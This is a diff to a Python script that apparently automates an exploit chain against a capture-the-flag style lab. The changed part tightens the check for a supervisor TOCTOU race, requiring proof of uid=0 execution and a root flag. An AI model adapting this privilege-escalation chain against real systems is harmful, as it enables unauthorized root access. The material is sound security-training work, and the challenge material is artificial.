@@ -32,6 +32,8 @@ UUID_RE = re.compile(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{
 FLAG_RE = re.compile(r"RF\{[0-9a-f]{32}\}")
 WEB_ID_RE = re.compile(r"uid=65532(?:\([^)]*\))?")
 RELAY_ID_RE = re.compile(r"uid=\d+\(relay\)")
+ROOT_UID_PROOF_RE = re.compile(r"(?m)^ROOT_UID=0\r?$")
+ROOT_FLAG_PROOF_RE = re.compile(r"(?m)^ROOT_FLAG=(RF\{[0-9a-f]{32}\})\r?$")
 LEAK_RE = re.compile(r"worker_shell=(0x[0-9a-fA-F]+)\Z")
 CSRF_RE = re.compile(rb'name="csrf_token" value="([A-Za-z0-9_-]+)"')
 
@@ -456,13 +458,17 @@ def run(args: argparse.Namespace) -> str:
             f"python3 {shlex.quote(remote_script)} {shlex.quote(job_id)}",
             args.race_timeout,
         )
-        flag_match = FLAG_RE.search(race_output)
-        if race_rc != 0 or flag_match is None:
+        uid_match = ROOT_UID_PROOF_RE.search(race_output)
+        flag_match = ROOT_FLAG_PROOF_RE.search(race_output)
+        if race_rc != 0 or uid_match is None or flag_match is None:
             raise ChainError(
-                f"Supervisor race failed (rc={race_rc}): {race_output.strip()!r}"
+                "Supervisor diagnostic race did not prove uid=0 and return the exact flag "
+                f"(rc={race_rc}): {race_output.strip()!r}"
             )
-        flag = flag_match.group(0)
-        print("[+] Supervisor TOCTOU: root-only flag disclosed")
+        flag = flag_match.group(1)
+        if FLAG_RE.fullmatch(flag) is None:
+            raise ChainError("Supervisor diagnostic returned a malformed root flag")
+        print("[+] Supervisor diagnostic TOCTOU: uid=0 execution and root flag obtained")
         print(flag)
         return flag
     finally:
